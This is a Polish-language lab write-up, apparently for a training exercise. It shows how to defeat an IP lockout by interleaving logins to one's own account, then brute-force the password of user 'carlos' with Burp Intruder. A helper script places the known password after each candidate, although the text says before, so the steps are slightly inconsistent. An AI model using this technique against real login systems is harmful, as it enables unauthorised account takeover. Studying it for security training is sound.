## Podatności

- **Broken Brute-Force Protection** - możliwość resetowania licznika nieudanych prób poprzez zalogowanie się na własne konto.
    
- **IP Block Bypass** - obejście blokady IP poprzez przeplatanie prób logowania na własne konto i konto `carlos`.
    
- **Password Brute-force** - atak słownikowy na hasło użytkownika `carlos`.
    

W tym labie celem jest obejście blokady IP po 3 niepoprawnych próbach logowania, a następnie brute-force hasła użytkownika `carlos`.

## Metodologia: Lab 4

#### Krok 1: Wykrycie sposobu obejścia blokady

1. Wykonaj 3 niepoprawne próby logowania i zauważ, że IP zostaje tymczasowo zablokowane.
    
2. Zaloguj się na własne konto przed osiągnięciem limitu.
    
3. Zauważ, że poprawne logowanie resetuje licznik nieudanych prób.
    

Dzięki temu możemy wykonywać próby w schemacie:

```text
moje konto → carlos → moje konto → carlos → ...
```

#### Krok 2: Przechwycenie żądania

1. Przechwyć `POST /login` w Burp Proxy.
    
2. Wyślij request do **Intrudera**.
    
3. Ustaw typ ataku:
    

```text
Pitchfork
```

4. Ustaw payload positions w `username` i `password`.
    

#### Krok 3: Resource pool

W zakładce **Resource pool** ustaw:

```text
Maximum concurrent requests = 1
```

Jeden request na raz jest wymagany, aby zachować odpowiednią kolejność prób logowania.

#### Krok 4: Payload 1 — Username

W **Payload position 1** przygotuj listę naprzemiennie zawierającą własny username i `carlos`:

```text
moj_username
carlos
moj_username
carlos
moj_username
carlos
...
```

`carlos` powinien zostać powtórzony co najmniej 100 razy.

#### Krok 5: Payload 2 — Password

Do listy candidate passwords dodaj własne hasło przed każdym kandydatem.

Przykład:

```text
MOJE_HASLO
123456
MOJE_HASLO
password
MOJE_HASLO
qwerty
...
```

Dzięki temu:

```text
moj_username + MOJE_HASLO → reset licznika
carlos + 123456            → próba
moj_username + MOJE_HASLO → reset licznika
carlos + password          → próba
```

#### Krok 6: Przygotowanie listy haseł skryptem

Napisaliśmy własny skrypt w Pythonie, który automatycznie dodaje nasze hasło `peter` przed każdą linią w pliku:

```python
def get_file(url: str):
    new_array = []

    with open(url, 'r+', encoding='utf-8') as f:
        content = f.readlines()

        for line in content:
            new_array.append(line)
            new_array.append('peter\n')

        f.seek(0)
        f.writelines(new_array)
        f.truncate()

    return new_array


def show_new_array(new_array):
    for index, line in enumerate(new_array):
        print(f"[+]{index}: {line.strip()}")


if __name__ == "__main__":
    URL = r'SCIEZKA'
    new_array = get_file(URL)
    show_new_array(new_array)
```

Przykład:

```text
123456
peter
password
peter
qwerty
peter
```

#### Krok 7: Analiza wyników

1. Uruchom atak.
    
2. Ukryj odpowiedzi z kodem `200`.
    
3. Posortuj wyniki po `username`.
    
4. Dla `carlos` powinna pojawić się jedna odpowiedź:
    

```text
302 Found
```

5. Hasło odczytaj z kolumny **Payload 2**.
    

#### Krok 8: Logowanie

Zaloguj się na konto:

```text
username=carlos
password=ZNALEZIONE_HASLO
```

Wejdź na stronę konta `carlos`, aby rozwiązać lab.